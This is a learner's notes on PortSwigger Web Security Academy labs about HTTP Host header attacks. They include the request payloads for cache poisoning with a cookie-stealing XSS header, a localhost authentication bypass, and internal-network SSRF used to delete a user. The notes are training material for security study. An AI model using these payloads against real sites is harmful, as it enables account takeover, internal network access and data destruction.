# How to identify and exploit HTTP Host header vulnerabilities
https://portswigger.net/web-security/host-header/exploiting

How to identify and exploit HTTP Host header vulnerabilities:
1. Check for flawed validation
2. Inject duplicate Host headers
3. Supply an absolute URL
4. Add line wrapping ( by indentation)
5. Inject host override headers (X-Forwarded-Host / X-Host / X-Forwarded-Server / X-HTTP-Host-Override / Forwarded)


# 1. Lab: Web cache poisoning via the Host header
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
 To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser. 

 xss shit

 1. change original HH - observe 500 failed
 2. add another HH and change value to test - observe reflection in response
 3. experiment with different values until payload:

```
    Host: 0a18008d04cfbdb1c061c9350092009a.web-security-academy.net
    Host: blah"onerror=alert(document.cookie)//
```
note:


request field:
```
Cache-Control: max-age=0
```

response fields:
```
Cache-Control: max-age=30
Age: 28
X-Cache: hit
```

**XSSed the Cache**

# 2. Lab: Host header authentication bypass
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass

To solve the lab, access the admin panel and delete Carlos's account. 

1. request admin panel - observe 401 unauthorised:
```
    GET / HTTP/1.1
    Host: 0ab2006f037c2dbbc013efc9004f0026.web-security-academy.net
```

response:
```
    HTTP/1.1 401 Unauthorized

```
2. change Host - experiment different values:
```
    127.0.0.1 - fails

```
payload:
```
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
```

# 3. Lab: Routing-based SSRF

note: 

require collaborator? just for first stage so we can skip testing via collaborator (sorry for it - will be comleted with burp pro)


1. send **GET /admin /HTTP1.1** to **intruder**, Change Host field to **192.168.0.x**, mark **x** with payload marker (ยงxยง):

```
GET /admin HTTP/1.1
Host: 192.168.0.ยง0ยง
```

2. use intruder payload "number" and set:
```
from: 0
to: 255
step: 1
```

3. find the only response that is not **504** and send to repeater

4. send and observe we get admin panel in response with delete user interface

5. **request in browser** and send delete request: observe it fail. 

6. research in proxy. find out **host** changed back to original.

7. change to local adress and try again

# portswigger solution:

    in admin panel research delete form:
    observe method: **POST**
    observe path: **admin/delete** 
    observe required fields: **csrf - sVn2OQMP3K1id3suCsKbb2WgwH1iA8KU**
    username - 

resend message to repeater and change to craft a valid delete request:

    POST /admin/delete HTTP/1.1
    Host: 192.168.0.49
    ..

    csrf=sVn2OQMP3K1id3suCsKbb2WgwH1iA8KU&username=carlos

**DELETED**

# 4. Lab: SSRF via flawed request parsing
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing

 To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos. 

require collaborator? only for verification of vulnarbility
